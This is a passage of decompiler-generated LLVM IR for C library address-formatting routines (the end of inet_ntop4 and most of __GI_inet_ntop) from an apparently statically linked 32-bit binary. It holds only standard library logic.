  %v1_8053f88 = add i32 %v0_8053f3a, 2
  store i32 %v1_8053f88, i32* @ecx, align 4
  %v1_8053f8d = trunc i16 %tmp44 to i8
  %v2_8053f8d = or i8 %v1_8053f8d, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v12_8053f8d = zext i8 %v2_8053f8d to i32
  store i32 %v12_8053f8d, i32* %eax.global-to-local, align 4
  %v4_8053f8f = add i32 %v0_8053f3a, 44
  %v5_8053f8f = add i32 %v4_8053f8f, %v0_8053f43
  %v6_8053f8f = inttoptr i32 %v5_8053f8f to i8*
  store i8 %v2_8053f8d, i8* %v6_8053f8f, align 1
  br label %dec_label_pc_8053f93

dec_label_pc_8053f93:                             ; preds = %dec_label_pc_8053f4a, %dec_label_pc_8053f6a, %dec_label_pc_8053f70
  %v0_8053f93 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8053f93 = inttoptr i32 %v0_8053f93 to i8*
  %v2_8053f93 = load i8, i8* %v1_8053f93, align 1
  %v3_8053f93 = zext i8 %v2_8053f93 to i32
  store i32 %v3_8053f93, i32* %eax.global-to-local, align 4
  %v0_8053f9c = load i32, i32* @esi, align 4
  %v1_8053f9c = add i32 %v0_8053f9c, 1
  store i32 %v1_8053f9c, i32* @esi, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_8053fa1 = load i32, i32* @esp, align 4
  %v1_8053fa1 = load i32, i32* @ecx, align 4
  %v2_8053fa1 = add i32 %v0_8053fa1, 44
  %v3_8053fa1 = add i32 %v2_8053fa1, %v1_8053fa1
  %v4_8053fa1 = inttoptr i32 %v3_8053fa1 to i8*
  store i8 46, i8* %v4_8053fa1, align 1
  %v0_8053fa6 = load i32, i32* @ecx, align 4
  %v1_8053fa6 = add i32 %v0_8053fa6, 2
  store i32 %v1_8053fa6, i32* %edi.global-to-local, align 4
  %v0_8053fa9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053fa9 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053fa9 = zext i32 %v1_8053fa9 to i64
  %v3_8053fa9 = load i32, i32* %edx.global-to-local, align 4
  %v4_8053fa9 = zext i32 %v3_8053fa9 to i64
  %v5_8053fa9 = mul nuw i64 %v4_8053fa9, 4294967296
  %v6_8053fa9 = or i64 %v5_8053fa9, %v2_8053fa9
  %v7_8053fa9 = zext i32 %v0_8053fa9 to i64
  %v8_8053fa9 = udiv i64 %v6_8053fa9, %v7_8053fa9
  %v9_8053fa9 = trunc i64 %v8_8053fa9 to i32
  %v10_8053fa9 = urem i64 %v6_8053fa9, %v7_8053fa9
  %v11_8053fa9 = trunc i64 %v10_8053fa9 to i32
  store i32 %v11_8053fa9, i32* @edx, align 4
  %v3_8053fab = and i32 %v9_8053fa9, -256
  %v1_8053fad = trunc i64 %v10_8053fa9 to i8
  %v2_8053fad = add i8 %v1_8053fad, 48
  %v12_8053fad = zext i8 %v2_8053fad to i32
  %v15_8053fad = or i32 %v12_8053fad, %v3_8053fab
  store i32 %v15_8053fad, i32* %eax.global-to-local, align 4
  %v2_8053faf = load i32, i32* @esp, align 4
  %v4_8053faf = add i32 %v0_8053fa6, 43
  %v5_8053faf = add i32 %v4_8053faf, %v2_8053faf
  %v6_8053faf = inttoptr i32 %v5_8053faf to i8*
  store i8 %v2_8053fad, i8* %v6_8053faf, align 1
  %v0_8053fb3 = load i32, i32* @esi, align 4
  %v10_8053fb3 = icmp eq i32 %v0_8053fb3, 3
  store i1 %v10_8053fb3, i1* %zf.global-to-local, align 1
  %v7_8053fb6 = icmp sgt i32 %v0_8053fb3, 3
  %v1_8053fbc.pre = load i32, i32* %edi.global-to-local, align 4
  br i1 %v7_8053fb6, label %dec_label_pc_8053fbc, label %dec_label_pc_8053f20

dec_label_pc_8053fbc:                             ; preds = %dec_label_pc_8053f93, %entry
  %v1_8053fbc = phi i32 [ 0, %entry ], [ %v1_8053fbc.pre, %dec_label_pc_8053f93 ]
  %v0_8053fbc = load i32, i32* @esp, align 4
  %v2_8053fbc = add i32 %v0_8053fbc, 42
  %v3_8053fbc = add i32 %v2_8053fbc, %v1_8053fbc
  %v4_8053fbc = inttoptr i32 %v3_8053fbc to i8*
  store i8 0, i8* %v4_8053fbc, align 1
  %v0_8053fc1 = load i32, i32* @esp, align 4
  %v9_8053fc1 = icmp eq i32 %v0_8053fc1, 12
  store i1 %v9_8053fc1, i1* %zf.global-to-local, align 1
  %tmp27 = bitcast i32* %stack_var_-33 to i8*
  store i8* %tmp27, i8** %stack_var_-92, align 4
  %v3_8053fc9 = call i32 @strlen(i8* %tmp27)
  store i32 %v3_8053fc9, i32* @eax, align 4
  %v15_8053fd1 = icmp eq i32 %v3_8053fc9, %v0_8053f08
  store i1 %v15_8053fd1, i1* %zf.global-to-local, align 1
  %tmp45 = icmp ugt i32 %v3_8053fc9, %v0_8053f08
  br i1 %tmp45, label %dec_label_pc_8053fd7, label %dec_label_pc_8053fe6

dec_label_pc_8053fd7:                             ; preds = %dec_label_pc_8053fbc
  %v0_8053fd7 = load i8*, i8** %stack_var_-92, align 4
  %v1_8053fd7 = ptrtoint i8* %v0_8053fd7 to i32
  %v2_8053fd7 = call i32 @__errno_location(i32 %v1_8053fd7)
  %v1_8053fdc = inttoptr i32 %v2_8053fd7 to i32*
  store i32 28, i32* %v1_8053fdc, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8053ff5.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053ff5

dec_label_pc_8053fe6:                             ; preds = %dec_label_pc_8053fbc
  %v2_8053fc4 = ptrtoint i32* %stack_var_-33 to i32
  %tmp28 = bitcast i8** %stack_var_-56 to i32*
  %v3_8053fe94 = load i32, i32* %tmp28, align 4
  %tmp29 = bitcast i8** %stack_var_-92 to i32*
  store i32 %v3_8053fe94, i32* %tmp29, align 4
  %v0_8053fed.cast = inttoptr i32 %v3_8053fe94 to i8*
  %v4_8053fed = call i32 @strcpy(i8* %v0_8053fed.cast, i32 %v2_8053fc4)
  store i32 %v4_8053fed, i32* %eax.global-to-local, align 4
  %v0_8053ff2 = load i32, i32* @esp, align 4
  %v6_8053ff2 = icmp eq i32 %v0_8053ff2, -16
  store i1 %v6_8053ff2, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8053ff5

dec_label_pc_8053ff5:                             ; preds = %dec_label_pc_8053fd7, %dec_label_pc_8053fe6
  %v0_8053ffc = phi i32 [ 0, %dec_label_pc_8053fd7 ], [ %v4_8053fed, %dec_label_pc_8053fe6 ]
  %v0_8053ff5 = phi i32 [ %v0_8053ff5.pre, %dec_label_pc_8053fd7 ], [ %v15_8053ef2, %dec_label_pc_8053fe6 ]
  %v9_8053ff5 = icmp eq i32 %v0_8053ff5, -60
  store i1 %v9_8053ff5, i1* %zf.global-to-local, align 1
  store i32 %v0_8053eee, i32* @esi, align 4
  store i32 %v0_8053eed, i32* @edi, align 4
  ret i32 %v0_8053ffc

; uselistorder directives
  uselistorder i32 %v0_8053fb3, { 2, 0, 1 }
  uselistorder i8 %v2_8053f8d, { 1, 0 }
  uselistorder i32 %v0_8053f72, { 1, 0 }
  uselistorder i1 %v11_8053f43, { 1, 0 }
  uselistorder i32 %v1_8053f3a, { 1, 0 }
  uselistorder i32 %v5_8053f28, { 1, 0 }
  uselistorder i32 %v0_8053fb330, { 1, 2, 0 }
  uselistorder i32* %stack_var_-33, { 2, 0, 1 }
  uselistorder i8** %stack_var_-92, { 0, 2, 1 }
  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 4, 11, 5, 6, 7, 8, 9, 10, 12 }
  uselistorder i32 -16, { 0, 1, 23, 24, 25, 14, 16, 17, 13, 15, 8, 18, 12, 19, 20, 21, 22, 26, 36, 37, 9, 31, 27, 10, 28, 29, 30, 32, 33, 11, 34, 35, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 42, { 1, 0 }
  uselistorder i16 10, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 43, { 2, 3, 4, 0, 1 }
  uselistorder i8 48, { 11, 7, 8, 0, 9, 12, 13, 1, 10, 2, 3, 5, 4, 6, 14 }
  uselistorder i8 100, { 2, 3, 0, 1 }
  uselistorder i1* @df, { 4, 28, 29, 0, 1, 30, 31, 32, 11, 2, 3, 40, 41, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32 -65536, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8053ff5, { 1, 0 }
  uselistorder label %dec_label_pc_8053f93, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i8*, align 4
  store i8* %arg3, i8** %stack_var_12, align 4
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-124 = alloca i8*, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_8053ffe = load i32, i32* @edi, align 4
  %v0_8053fff = load i32, i32* @esi, align 4
  %v0_8054000 = load i32, i32* @ebx, align 4
  %v15_8054001 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_8054008 = icmp eq i32 %arg1, 2
  br i1 %v9_8054008, label %dec_label_pc_8054018, label %dec_label_pc_805400d

dec_label_pc_805400d:                             ; preds = %entry
  %v9_805400d = icmp eq i32 %arg1, 10
  %v1_8054010 = icmp eq i1 %v9_805400d, false
  br i1 %v1_8054010, label %dec_label_pc_80541b7, label %dec_label_pc_8054030

dec_label_pc_8054018:                             ; preds = %entry
  %v4_8054018 = ptrtoint i8* %arg3 to i32
  store i32 %v4_8054018, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_8054024 = call i32 @inet_ntop4(i32 %v0_8054000, i32 %v0_8053fff, i32 %v0_8053ffe)
  store i32 %v3_8054024, i32* %eax.global-to-local, align 4
  store i32 %v3_8054024, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80541c4

dec_label_pc_8054030:                             ; preds = %dec_label_pc_805400d
  store i32 %arg1, i32* %stack_var_-112, align 4
  %v2_8054035 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8054035, i32* %eax.global-to-local, align 4
  %tmp44 = bitcast i32* %stack_var_-48 to i8*
  store i8* %tmp44, i8** %stack_var_-124, align 4
  %v6_805403a = call i32 @__GI_memset(i8* %tmp44, i32 0, i32 32)
  store i32 %v6_805403a, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_805405c = add i32 %arg2, 1
  br label %dec_label_pc_8054046

dec_label_pc_8054046:                             ; preds = %dec_label_pc_8054046.dec_label_pc_8054046_crit_edge, %dec_label_pc_8054030
  %v1_8054069 = phi i32 [ %v15_8054001, %dec_label_pc_8054030 ], [ %v1_8054069.pre, %dec_label_pc_8054046.dec_label_pc_8054046_crit_edge ]
  %v0_805406171 = phi i32 [ 0, %dec_label_pc_8054030 ], [ %v0_805406d.pre, %dec_label_pc_8054046.dec_label_pc_8054046_crit_edge ]
  %v1_805404f = ashr i32 %v0_805406171, 31
  %v2_8054050 = zext i32 %v0_805406171 to i64
  %v4_8054050 = zext i32 %v1_805404f to i64
  %v5_8054050 = mul nuw i64 %v4_8054050, 4294967296
  %v6_8054050 = or i64 %v5_8054050, %v2_8054050
  %v8_8054050 = sdiv i64 %v6_8054050, 2
  %v9_8054050 = trunc i64 %v8_8054050 to i32
  store i32 %v9_8054050, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %v9_8054050, i32* %ebx.global-to-local, align 4
  %v2_8054058 = add i32 %v0_805406171, %arg2
  %v3_8054058 = inttoptr i32 %v2_8054058 to i8*
  %v4_8054058 = load i8, i8* %v3_8054058, align 1
  %v5_8054058 = zext i8 %v4_8054058 to i32
  store i32 %v5_8054058, i32* %eax.global-to-local, align 4
  %v3_805405c = add i32 %v2_805405c, %v0_805406171
  %v4_805405c = inttoptr i32 %v3_805405c to i8*
  %v5_805405c = load i8, i8* %v4_805405c, align 1
  %v6_805405c = zext i8 %v5_805405c to i32
  store i32 %v6_805405c, i32* %edx.global-to-local, align 4
  %v1_8054061 = add i32 %v0_805406171, 2
  store i32 %v1_8054061, i32* %ecx.global-to-local, align 4
  %v2_8054064 = mul nuw nsw i32 %v5_8054058, 256
  %v2_8054067 = or i32 %v6_805405c, %v2_8054064
  store i32 %v2_8054067, i32* %eax.global-to-local, align 4
  %v3_8054069 = mul i32 %v9_8054050, 4
  %v4_8054069 = add i32 %v3_8054069, 60
  %v5_8054069 = add i32 %v4_8054069, %v1_8054069
  %v6_8054069 = inttoptr i32 %v5_8054069 to i32*
  store i32 %v2_8054067, i32* %v6_8054069, align 4
  %v0_805406d.pre = load i32, i32* %ecx.global-to-local, align 4
  %v7_8054070 = icmp sgt i32 %v0_805406d.pre, 15
  br i1 %v7_8054070, label %dec_label_pc_8054072, label %dec_label_pc_8054046.dec_label_pc_8054046_crit_edge

dec_label_pc_8054046.dec_label_pc_8054046_crit_edge: ; preds = %dec_label_pc_8054046
  %v1_8054069.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8054046

dec_label_pc_8054072:                             ; preds = %dec_label_pc_8054046
  %v4_8054030 = ptrtoint i32* %stack_var_-112 to i32
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @edi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_805407c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805407c

dec_label_pc_805407c:                             ; preds = %dec_label_pc_8054072, %dec_label_pc_80540a9
  %v0_80540a970 = phi i32 [ 0, %dec_label_pc_8054072 ], [ %v1_80540a9, %dec_label_pc_80540a9 ]
  %v0_805409469 = phi i32 [ -1, %dec_label_pc_8054072 ], [ %v0_80540949, %dec_label_pc_80540a9 ]
  %v0_80540b468 = phi i32 [ -1, %dec_label_pc_8054072 ], [ %v0_805409910, %dec_label_pc_80540a9 ]
  %v0_80540bf67 = phi i32 [ -1, %dec_label_pc_8054072 ], [ %v0_80540a414, %dec_label_pc_80540a9 ]
  %v2_805407c = mul nuw nsw i32 %v0_80540a970, 4
  %v3_805407c = add nuw nsw i32 %v2_805407c, 60
  %v4_805407c = add i32 %v3_805407c, %v0_805407c.pre
  %v5_805407c = inttoptr i32 %v4_805407c to i32*
  %v6_805407c = load i32, i32* %v5_805407c, align 4
  %v7_805407c = icmp eq i32 %v6_805407c, 0
  %v1_8054081 = icmp eq i1 %v7_805407c, false
  %v10_8054094 = icmp eq i32 %v0_805409469, -1
  br i1 %v1_8054081, label %dec_label_pc_8054094, label %dec_label_pc_8054083

dec_label_pc_8054083:                             ; preds = %dec_label_pc_805407c
  %v1_8054086 = icmp eq i1 %v10_8054094, false
  br i1 %v1_8054086, label %dec_label_pc_8054091, label %dec_label_pc_8054088

dec_label_pc_8054088:                             ; preds = %dec_label_pc_8054083
  store i32 %v0_80540a970, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80540a9

dec_label_pc_8054091:                             ; preds = %dec_label_pc_8054083
  %v0_8054091 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054091 = add i32 %v0_8054091, 1
  store i32 %v1_8054091, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80540a9

dec_label_pc_8054094:                             ; preds = %dec_label_pc_805407c
  br i1 %v10_8054094, label %dec_label_pc_80540a9, label %dec_label_pc_8054099

dec_label_pc_8054099:                             ; preds = %dec_label_pc_8054094
  %v10_8054099 = icmp eq i32 %v0_80540b468, -1
  %v0_80540a2.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_805409e = load i32, i32* @ebp, align 4
  %v7_80540a0 = icmp sgt i32 %v0_80540a2.pre, %v1_805409e
  %or.cond = or i1 %v10_8054099, %v7_80540a0
  br i1 %or.cond, label %dec_label_pc_80540a2, label %dec_label_pc_80540a6

dec_label_pc_80540a2:                             ; preds = %dec_label_pc_8054099
  store i32 %v0_80540a2.pre, i32* @ebp, align 4
  store i32 %v0_80540bf67, i32* @edi, align 4
  br label %dec_label_pc_80540a6

dec_label_pc_80540a6:                             ; preds = %dec_label_pc_8054099, %dec_label_pc_80540a2
  %v0_805409912 = phi i32 [ %v0_80540bf67, %dec_label_pc_80540a2 ], [ %v0_80540b468, %dec_label_pc_8054099 ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80540a9

dec_label_pc_80540a9:                             ; preds = %dec_label_pc_8054094, %dec_label_pc_8054091, %dec_label_pc_8054088, %dec_label_pc_80540a6
  %v0_80540a414 = phi i32 [ %v0_80540bf67, %dec_label_pc_8054094 ], [ %v0_80540bf67, %dec_label_pc_8054091 ], [ %v0_80540a970, %dec_label_pc_8054088 ], [ -1, %dec_label_pc_80540a6 ]
  %v0_80540949 = phi i32 [ -1, %dec_label_pc_8054094 ], [ %v0_805409469, %dec_label_pc_8054091 ], [ %v0_80540a970, %dec_label_pc_8054088 ], [ -1, %dec_label_pc_80540a6 ]
  %v0_805409910 = phi i32 [ %v0_80540b468, %dec_label_pc_8054094 ], [ %v0_80540b468, %dec_label_pc_8054091 ], [ %v0_80540b468, %dec_label_pc_8054088 ], [ %v0_805409912, %dec_label_pc_80540a6 ]
  %v1_80540a9 = add nuw nsw i32 %v0_80540a970, 1
  store i32 %v1_80540a9, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_80540a9, 8
  br i1 %exitcond, label %dec_label_pc_80540af, label %dec_label_pc_805407c

dec_label_pc_80540af:                             ; preds = %dec_label_pc_80540a9
  %v10_80540af = icmp eq i32 %v0_80540a414, -1
  br i1 %v10_80540af, label %dec_label_pc_80540c1, label %dec_label_pc_80540b4

dec_label_pc_80540b4:                             ; preds = %dec_label_pc_80540af
  %v10_80540b4 = icmp eq i32 %v0_805409910, -1
  %v0_80540bd.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v10_80540b4, label %dec_label_pc_80540bd, label %dec_label_pc_80540b9

dec_label_pc_80540b9:                             ; preds = %dec_label_pc_80540b4
  %v1_80540b9 = load i32, i32* @ebp, align 4
  %v7_80540bb = icmp sgt i32 %v0_80540bd.pre, %v1_80540b9
  br i1 %v7_80540bb, label %dec_label_pc_80540bd, label %dec_label_pc_80540c1

dec_label_pc_80540bd:                             ; preds = %dec_label_pc_80540b4, %dec_label_pc_80540b9
  store i32 %v0_80540bd.pre, i32* @ebp, align 4
  store i32 %v0_80540a414, i32* @edi, align 4
  br label %dec_label_pc_80540c1

dec_label_pc_80540c1:                             ; preds = %dec_label_pc_80540b9, %dec_label_pc_80540af, %dec_label_pc_80540bd
  %v5_80540ce = phi i32 [ %v0_805409910, %dec_label_pc_80540b9 ], [ %v0_805409910, %dec_label_pc_80540af ], [ %v0_80540a414, %dec_label_pc_80540bd ]
  %v10_80540c1 = icmp eq i32 %v5_80540ce, -1
  br i1 %v10_80540c1, label %dec_label_pc_80540d1, label %dec_label_pc_80540c6

dec_label_pc_80540c6:                             ; preds = %dec_label_pc_80540c1
  %v0_80540c6 = load i32, i32* @ebp, align 4
  %v1_80540c6 = add i32 %v0_80540c6, -1
  %v6_80540c6 = sub i32 0, %v0_80540c6
  %v7_80540c6 = and i32 %v0_80540c6, %v6_80540c6
  %v8_80540c6 = icmp slt i32 %v7_80540c6, 0
  %v9_80540c6 = icmp eq i32 %v1_80540c6, 0
  %v10_80540c6 = icmp slt i32 %v1_80540c6, 0
  store i32 -1, i32* %eax.global-to-local, align 4
  %v3_80540ce = icmp ne i1 %v10_80540c6, %v8_80540c6
  %v4_80540ce = or i1 %v9_80540c6, %v3_80540ce
  %v7_80540ce = select i1 %v4_80540ce, i32 -1, i32 %v5_80540ce
  store i32 %v7_80540ce, i32* @edi, align 4
  br label %dec_label_pc_80540d1

dec_label_pc_80540d1:                             ; preds = %dec_label_pc_80540c1, %dec_label_pc_80540c6
  %v0_805417119 = phi i32 [ %v5_80540ce, %dec_label_pc_80540c1 ], [ %v7_80540ce, %dec_label_pc_80540c6 ]
  %v2_80540d1 = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_80540d1, i32* @ebx, align 4
  %v3_8054153 = add i32 %v4_8054030, 64
  %v12_8054111 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @esi, align 4
  %v10_805417159 = icmp eq i32 %v0_805417119, -1
  %v1_8054119 = icmp eq i1 %v12_8054111, false
  br label %dec_label_pc_80540dc

dec_label_pc_80540dc:                             ; preds = %dec_label_pc_80540d1, %dec_label_pc_8054167
  %v10_805417166 = phi i1 [ %v10_805417159, %dec_label_pc_80540d1 ], [ %v10_8054171, %dec_label_pc_8054167 ]
  %v0_80540f665 = phi i32 [ 0, %dec_label_pc_80540d1 ], [ %v1_8054167, %dec_label_pc_8054167 ]
  %v1_80540ec64 = phi i32 [ %v0_805417119, %dec_label_pc_80540d1 ], [ %v0_8054171.pre, %dec_label_pc_8054167 ]
  %v0_80540fa63 = phi i32 [ %v2_80540d1, %dec_label_pc_80540d1 ], [ %v0_80540f020, %dec_label_pc_8054167 ]
  %stack_var_-120.162 = phi i8* [ null, %dec_label_pc_80540d1 ], [ %stack_var_-120.0, %dec_label_pc_8054167 ]
  %stack_var_-116.161 = phi i32 [ 32, %dec_label_pc_80540d1 ], [ %stack_var_-116.0, %dec_label_pc_8054167 ]
  br i1 %v10_805417166, label %dec_label_pc_80540f6, label %dec_label_pc_80540e1

dec_label_pc_80540e1:                             ; preds = %dec_label_pc_80540dc
  %v2_80540e1 = sub i32 %v0_80540f665, %v1_80540ec64
  %v8_80540e1 = xor i32 %v0_80540f665, %v1_80540ec64
  %v9_80540e1 = xor i32 %v2_80540e1, %v0_80540f665
  %v10_80540e1 = and i32 %v9_80540e1, %v8_80540e1
  %v11_80540e1 = icmp slt i32 %v10_80540e1, 0
  %v12_80540e1 = icmp eq i32 %v2_80540e1, 0
  %v13_80540e1 = icmp slt i32 %v2_80540e1, 0
  %v2_80540e3 = icmp eq i1 %v13_80540e1, %v11_80540e1
  br i1 %v2_80540e3, label %dec_label_pc_80540e5, label %dec_label_pc_80540f6

dec_label_pc_80540e5:                             ; preds = %dec_label_pc_80540e1
  %v1_80540e5 = load i32, i32* @ebp, align 4
  %v2_80540e5 = add i32 %v1_80540e5, %v1_80540ec64
  store i32 %v2_80540e5, i32* %eax.global-to-local, align 4
  %v2_80540e8 = sub i32 %v0_80540f665, %v2_80540e5
  %v8_80540e8 = xor i32 %v2_80540e5, %v0_80540f665
  %v9_80540e8 = xor i32 %v2_80540e8, %v0_80540f665
  %v10_80540e8 = and i32 %v9_80540e8, %v8_80540e8
  %v11_80540e8 = icmp slt i32 %v10_80540e8, 0
  %v13_80540e8 = icmp slt i32 %v2_80540e8, 0
  %v2_80540ea = icmp eq i1 %v13_80540e8, %v11_80540e8
  br i1 %v2_80540ea, label %dec_label_pc_80540f6, label %dec_label_pc_80540ec

dec_label_pc_80540ec:                             ; preds = %dec_label_pc_80540e5
  %v1_80540ee = icmp eq i1 %v12_80540e1, false
  br i1 %v1_80540ee, label %dec_label_pc_8054167, label %dec_label_pc_80540f0

dec_label_pc_80540f0:                             ; preds = %dec_label_pc_80540ec
  %v1_80540f0 = inttoptr i32 %v0_80540fa63 to i8*
  store i8 58, i8* %v1_80540f0, align 1
  %v0_80540f3 = load i32, i32* @ebx, align 4
  %v1_80540f3 = add i32 %v0_80540f3, 1
  store i32 %v1_80540f3, i32* @ebx, align 4
  br label %dec_label_pc_8054167

dec_label_pc_80540f6:                             ; preds = %dec_label_pc_80540e1, %dec_label_pc_80540e5, %dec_label_pc_80540dc
  %v1_80540f6 = icmp eq i32 %v0_80540f665, 0
  br i1 %v1_80540f6, label %dec_label_pc_80540fe, label %dec_label_pc_80540fa

dec_label_pc_80540fa:                             ; preds = %dec_label_pc_80540f6
  %v1_80540fa = inttoptr i32 %v0_80540fa63 to i8*
  store i8 58, i8* %v1_80540fa, align 1
  %v0_80540fd = load i32, i32* @ebx, align 4
  %v1_80540fd = add i32 %v0_80540fd, 1
  store i32 %v1_80540fd, i32* @ebx, align 4
  %v0_80540fe.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80540fe

dec_label_pc_80540fe:                             ; preds = %dec_label_pc_80540f6, %dec_label_pc_80540fa
  %v0_805415c = phi i32 [ %v0_80540fa63, %dec_label_pc_80540f6 ], [ %v1_80540fd, %dec_label_pc_80540fa ]
  %v1_8054153 = phi i32 [ 0, %dec_label_pc_80540f6 ], [ %v0_80540fe.pre, %dec_label_pc_80540fa ]
  %v9_80540fe = icmp eq i32 %v1_8054153, 6
  %v1_8054101 = icmp eq i1 %v9_80540fe, false
  br i1 %v1_8054101, label %dec_label_pc_8054152, label %dec_label_pc_8054103

dec_label_pc_8054103:                             ; preds = %dec_label_pc_80540fe
  %v0_8054103 = load i32, i32* @edi, align 4
  %v1_8054103 = icmp eq i32 %v0_8054103, 0
  %v1_8054105 = icmp eq i1 %v1_8054103, false
  br i1 %v1_8054105, label %dec_label_pc_8054152, label %dec_label_pc_8054107

dec_label_pc_8054107:                             ; preds = %dec_label_pc_8054103
  %v0_8054107 = load i32, i32* @ebp, align 4
  %v9_8054107 = icmp eq i32 %v0_8054107, 6
  br i1 %v9_8054107, label %dec_label_pc_805411b, label %dec_label_pc_805410c

dec_label_pc_805410c:                             ; preds = %dec_label_pc_8054107
  %v9_805410c = icmp eq i32 %v0_8054107, 5
  %v1_805410f = icmp eq i1 %v9_805410c, false
  br i1 %v1_805410f, label %dec_label_pc_8054152, label %dec_label_pc_8054111

dec_label_pc_8054111:                             ; preds = %dec_label_pc_805410c
  br i1 %v1_8054119, label %dec_label_pc_8054152, label %dec_label_pc_805411b

dec_label_pc_805411b:                             ; preds = %dec_label_pc_8054111, %dec_label_pc_8054107
  %v2_8054121 = sub i32 %v0_805415c, %v2_80540d1
  store i32 %v2_8054121, i32* @esi, align 4
  %v2_805412c = sub i32 46, %v2_8054121
  store i32 %v2_805412c, i32* @ecx, align 4
  store i32 %v0_805415c, i32* @edx, align 4
  %v1_8054130 = add i32 %arg2, 12
  store i32 %v1_8054130, i32* @eax, align 4
  %v0_8054133 = load i8*, i8** %stack_var_-124, align 4
  %v1_8054133 = ptrtoint i8* %v0_8054133 to i32
  %v3_8054133 = ptrtoint i8* %stack_var_-120.162 to i32
  %v5_8054133 = call i32 @inet_ntop4(i32 %v1_8054133, i32 %v3_8054133, i32 %stack_var_-116.161)
  store i32 %v5_8054133, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_805413a = icmp eq i32 %v5_8054133, 0
  br i1 %v1_805413a, label %dec_label_pc_80541c4, label %dec_label_pc_8054142

dec_label_pc_8054142:                             ; preds = %dec_label_pc_805411b
  %v0_8054145 = load i32, i32* @ebx, align 4
  %v5_8054145 = inttoptr i32 %v0_8054145 to i8*
  store i8* %v5_8054145, i8** %stack_var_-124, align 4
  %v3_8054146 = call i32 @strlen(i8* %v5_8054145)
  store i32 %v3_8054146, i32* %eax.global-to-local, align 4
  %v0_805414e = load i32, i32* @ebx, align 4
  %v3_805414e = add i32 %v0_805414e, %v3_8054146
  store i32 %v3_805414e, i32* @ebx, align 4
  %v0_8054176.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8054176

dec_label_pc_8054152:                             ; preds = %dec_label_pc_8054111, %dec_label_pc_805410c, %dec_label_pc_8054103, %dec_label_pc_80540fe
  %v0_8054152 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8054152, i32* %stack_var_-112, align 4
  %v2_8054153 = mul i32 %v1_8054153, 4
  %v4_8054153 = add i32 %v3_8054153, %v2_8054153
  %v5_8054153 = inttoptr i32 %v4_8054153 to i32*
  %v6_8054153 = load i32, i32* %v5_8054153, align 4
  %v5_805415c = inttoptr i32 %v0_805415c to i8*
  store i8* %v5_805415c, i8** %stack_var_-124, align 4
  %v6_805415d = call i32 @sprintf(i32 %v0_805415c, i32 ptrtoint ([3 x i8]* @global_var_8058671.257 to i32), i32 %v6_8054153, i32 %v0_8054152)
  store i32 %v6_805415d, i32* %eax.global-to-local, align 4
  %v0_8054165 = load i32, i32* @ebx, align 4
  %v2_8054165 = add i32 %v0_8054165, %v6_805415d
  store i32 %v2_8054165, i32* @ebx, align 4
  br label %dec_label_pc_8054167

dec_label_pc_8054167:                             ; preds = %dec_label_pc_80540ec, %dec_label_pc_80540f0, %dec_label_pc_8054152
  %stack_var_-116.0 = phi i32 [ %v6_8054153, %dec_label_pc_8054152 ], [ %stack_var_-116.161, %dec_label_pc_80540ec ], [ %stack_var_-116.161, %dec_label_pc_80540f0 ]
  %stack_var_-120.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8058671.257, i32 0, i32 0), %dec_label_pc_8054152 ], [ %stack_var_-120.162, %dec_label_pc_80540ec ], [ %stack_var_-120.162, %dec_label_pc_80540f0 ]
  %v0_80540f020 = phi i32 [ %v2_8054165, %dec_label_pc_8054152 ], [ %v0_80540fa63, %dec_label_pc_80540ec ], [ %v1_80540f3, %dec_label_pc_80540f0 ]
